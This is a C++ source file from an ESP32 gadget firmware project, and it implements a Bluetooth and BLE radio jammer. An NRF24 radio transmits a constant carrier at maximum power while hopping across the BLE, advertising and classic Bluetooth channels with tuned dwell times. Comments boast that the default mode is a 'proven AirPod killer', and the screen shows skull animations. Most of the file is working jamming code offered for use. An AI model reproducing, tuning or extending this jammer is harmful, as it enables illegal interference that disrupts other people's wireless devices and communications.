rgomez31UAQ/ESP32-DIV_CYD-Gadget/bluetooth_attacks.cpp
// Mode channel pointers for clean loop access
// Adaptive dwell: target ~1.5ms sweep regardless of channel count
// Fewer channels = longer dwell per channel = same sweep rate for all modes
struct BjJamMode {
    const uint8_t* channels;
    int count;
    int dwellUs;  // microseconds to sit on each channel
};
static const BjJamMode bjModes[] = {
    {BJ_BLE_CHANNELS,      BJ_BLE_COUNT,      38},   // 40ch × 38us = 1.52ms sweep
    {BJ_BLE_ADV_CHANNELS,  BJ_BLE_ADV_COUNT,  125},  // 12ch × 125us = 1.50ms sweep
    {BJ_BT_CHANNELS,       BJ_BT_COUNT,       19},   // 79ch × 19us = 1.50ms sweep
    {BJ_ADV_KILL_CHANNELS, BJ_ADV_KILL_COUNT, 500}   //  3ch × 500us = 1.50ms sweep — MAXIMUM FOCUS
};

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY CONSTANTS - 85-BAR EQUALIZER (matches WLAN/SubGHz Jammer)
// ═══════════════════════════════════════════════════════════════════════════
#define BJ_GRAPH_X      2
#define BJ_GRAPH_Y      155
#define BJ_GRAPH_WIDTH  GRAPH_FULL_W
#define BJ_GRAPH_HEIGHT 106
#define BJ_NUM_BARS     85

// Skull rows - 3 rows of 8 = 24 skulls (matches SubGHz Jammer)
#define BJ_SKULL_Y           (SCREEN_HEIGHT - 55)
#define BJ_SKULL_ROWS        3
#define BJ_SKULL_ROW_SPACING 18
#define BJ_SKULL_NUM         8

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════
static bool initialized = false;
static bool exitRequested = false;
static volatile bool jamming = false;           // volatile — shared between cores
static int currentMode = BJ_MODE_BLE_ADV;        // Default BLE ADV — proven AirPod killer
static volatile int currentNRFChannel = BJ_BT_NRF_START;  // volatile — read by display, written by jam task
static volatile int hopIndex = 0;
static unsigned long lastDisplayTime = 0;
static volatile int bjHitCount = 0;             // volatile — incremented by jam task, read by display

// Equalizer heat levels
static uint8_t channelHeat[BJ_NUM_BARS] = {0};
static int skullFrame = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE JAMMER — FreeRTOS task on Core 0
// NRF24 uses VSPI (GPIO 18/19/23). Display uses HSPI (GPIO 12/13/14).
// Separate hardware SPI buses = zero conflict. Jammer runs 100% duty cycle
// on core 0 while display animations run full speed on core 1.
// ═══════════════════════════════════════════════════════════════════════════
static TaskHandle_t bjJamTaskHandle = NULL;
static volatile bool bjJamTaskRunning = false;
static volatile bool bjJamTaskDone = false;      // task signals when cleanup is complete
static volatile int bjJamMode = BJ_MODE_BLE_ADV; // shadow of currentMode for jam task

static void bjJamTask(void* param) {
    // ═══════════════════════════════════════════════════════════════════════
    // ALL SPI + NRF24 operations happen HERE on core 0.
    // ESP32 SPI driver registers ISR on the core that calls spi_bus_initialize().
    // If we init on core 1 and use from core 0, transactions are malformed/weak.
    // Solution: init, use, AND cleanup all on core 0. Core 1 never touches radio.
    // ═══════════════════════════════════════════════════════════════════════

    // Init SPI on THIS core
    SPI.end();
    delay(2);
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    delay(5);

    // Init radio on THIS core
    if (!nrf24Radio.begin()) {
        Serial.println("[BLEJAM] Core 0: NRF24 begin() FAILED");
        bjJamTaskDone = true;
        vTaskDelete(NULL);
        return;
    }

    // startConstCarrier — continuous wave, 100% duty cycle, ALWAYS transmitting
    // setChannel() just steers the frequency — carrier never stops
    // This is what was PROVEN to kill AirPods on the spectrum analyzer
    nrf24Radio.stopListening();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.startConstCarrier(RF24_PA_MAX, 50);
    nrf24Radio.setAddressWidth(5);
    nrf24Radio.setPayloadSize(2);
    nrf24Radio.setDataRate(RF24_2MBPS);

    Serial.printf("[BLEJAM] Core 0: SPI + NRF24 initialized, CW carrier active, isPVariant=%d\n",
                  nrf24Radio.isPVariant());

    int localHop = 0;
    int yieldCounter = 0;

    while (bjJamTaskRunning) {
        int mode = bjJamMode;  // local copy to avoid race
        const BjJamMode& m = bjModes[mode];

        localHop++;
        if (localHop >= m.count) localHop = 0;

        uint8_t ch = m.channels[localHop];
        nrf24Radio.setChannel(ch);  // Carrier stays ON, just hops frequency
        delayMicroseconds(m.dwellUs);  // Adaptive dwell — all modes sweep at ~1.5ms

        // Update shared state for display (volatile, races OK for display)
        currentNRFChannel = ch;
        hopIndex = localHop;
        bjHitCount++;

        // Feed watchdog on core 0 — yield every 100 hops
        // Without this, the idle task starves and watchdog reboots the ESP32
        yieldCounter++;
        if (yieldCounter >= 100) {
            yieldCounter = 0;
            vTaskDelay(1);  // 1 tick (~1ms) — keeps WDT happy, 99% duty cycle
        }
    }

    // Cleanup on THIS core — core 1 must NOT touch radio while task is alive
    nrf24Radio.stopConstCarrier();
    nrf24Radio.flush_tx();
    nrf24Radio.powerDown();
    SPI.end();

    Serial.println("[BLEJAM] Core 0: Radio powered down, SPI released");
    bjJamTaskDone = true;
    vTaskDelete(NULL);
}

// Short display names for FreeMonoBold18pt (must fit 240px screen)
static const char* BJ_MODE_DISPLAY[] = {"BLE", "BLE ADV", "BT FULL", "ADV KILL"};

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ICONS (same set as WLAN/SubGHz Jammer)
// ═══════════════════════════════════════════════════════════════════════════
static const unsigned char* bjSkulls[] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 6 icons (matches SubGHz Jammer layout)
// Back(10) | Toggle(60) | PrevMode(105) | NextMode(140) | Antenna(180) | Cycle(215)
// ═══════════════════════════════════════════════════════════════════════════
#define BJ_ICON_SIZE 16
#define BJ_ICON_NUM  6
static int bjIconX[BJ_ICON_NUM] = {10, 60, 105, 140, 180, 215};
static const unsigned char* bjIcons[BJ_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back
    bitmap_icon_start,             // 1: Toggle ON/OFF
    bitmap_icon_sort_down_minus,   // 2: Prev mode
    bitmap_icon_sort_up_plus,      // 3: Next mode
    bitmap_icon_antenna,           // 4: NRF24 status indicator
    bitmap_icon_recycle            // 5: Cycle mode
};

// ═══════════════════════════════════════════════════════════════════════════
// JAMMER ENGINE — Bruce firmware pattern (PROVEN ON AIRPODS)
// startConstCarrier() ONCE → setChannel() in tight loop
// DO NOT use raw SPI. DO NOT use data flooding. DO NOT clear REUSE_TX_PL.
// The REUSE_TX_PL flag set by startConstCarrier() on P-variant chips is
// what makes the chip continuously retransmit — it's the FEATURE, not a bug.
// We wasted an entire day trying to "fix" this. Bruce proves it works.
// ═══════════════════════════════════════════════════════════════════════════

